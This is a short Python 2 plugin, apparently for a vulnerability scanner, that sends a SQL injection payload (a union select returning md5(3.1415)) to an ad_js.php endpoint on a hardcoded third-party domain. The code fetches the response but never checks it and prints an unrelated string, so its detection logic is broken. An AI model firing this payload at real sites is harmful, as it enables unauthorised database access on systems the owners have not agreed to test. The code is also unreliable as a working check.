#!/usr/bin/env python
# coding : utf-8 
# author : 'Zend'
# team   : "gogobirds"

from plugins.init import register_plugin, pluginmap
import urllib2


@register_plugin("2plug")
def func(name):
    payload = "/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)"
    verify_url = "http://www.dw-ids.com/plus/" + payload
    req = urllib2.Request(verify_url)
    content = urllib2.urlopen(req).read()
    print "1234" + name

if __name__ == "__main__":
    pluginmap["2plug"]()